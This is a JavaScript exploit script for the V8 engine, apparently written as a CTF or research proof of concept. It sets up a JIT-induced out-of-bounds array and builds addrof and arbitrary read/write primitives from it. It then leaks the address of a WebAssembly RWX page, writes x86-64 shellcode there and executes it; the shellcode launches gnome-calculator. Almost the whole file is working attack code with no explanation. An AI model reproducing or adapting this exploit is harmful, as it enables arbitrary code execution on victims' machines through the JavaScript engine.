class Memeory{
    constructor() {
        this.buff = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buff);
        this.u32 = new Uint32Array(this.buff);
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

let mem = new Memeory();

function gc() {
    for (let i = 0; i < 0x10; i++){
        new ArrayBuffer(0x1000000);
    }
}

function fun(arg) {
    let x = arguments.length;
    oob = new Array(0x10);
    oob[0] = 1.1;
    a2 = new Array(0x10);
    a2[0] = 1.1;
    oob[(x >> 16) * 19] = 1.39064994160909e-309;
}

gc();

var a2 = [2.2];
var a3 = [1.1, 2.2];

var oob;

a3.length = 0x11000;
a3.fill(3.3);

gc();

var a4 = [1.1];

for (let i = 0; i < 100000; i++) fun(...a4);
fun(...a3);

var vic_object = {o:0x1234,obj:{}};
var vic_buffer = new ArrayBuffer(0x400);



let sc =  [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xeb, 0xfe, 0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00];

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,116,101,115,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,32,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.test;


console.log(oob.length);



class ARW {
    constructor(buf_offset,obj_offset){
        this.buf_offset = buf_offset;
        this.obj_offset = obj_offset;
    }
    read(addr){
        oob[this.buf_offset] = mem.u2f(addr);
        let tmp = new Float64Array(vic_buffer,0,8);
        return mem.f2u(tmp[0]);
    }
    write(addr, data){
        oob[this.buf_offset] = mem.u2f(addr);
        let tmp = new Float64Array(vic_buffer,0,8);
        tmp.set([mem.u2f(data)]);
    }
    addrof(aobj){
        vic_object.obj = aobj;
        return mem.f2u(oob[this.obj_offset])
    }
    writebuf(addr,data){
        oob[this.buf_offset] = mem.u2f(addr);
        let u8 = new Uint8Array(vic_buffer);
        for (let i = 0; i < data.length; i++){
            u8[i] = data[i];
        }
    }
}

arw = new ARW(58,46);



leak_heap = mem.f2u(oob[58]);
console.log("[*] Leak heap address is 0x" + leak_heap.toString(16));

leakfun = arw.addrof(f);
console.log("[*] Leak funciton addr is 0x" + leakfun.toString(16));

let shared_info = arw.read(leakfun - 1 + 0x18);
console.log("[*] leak shared_info is 0x" + shared_info.toString(16));
let Wasmdata = arw.read(shared_info - 1 + 0x8);
console.log("[*] leak Wasmdata addr is 0x" + Wasmdata.toString(16));
let instance_addr = arw.read(Wasmdata - 1 + 0x10);
console.log("[*] leak instance addr is " + instance_addr.toString(16));
let rwxmap = arw.read(instance_addr - 1 + 0xe8);
console.log("[*] leak rwx map is 0x" + rwxmap.toString(16));


arw.writebuf(rwxmap,sc);

f();



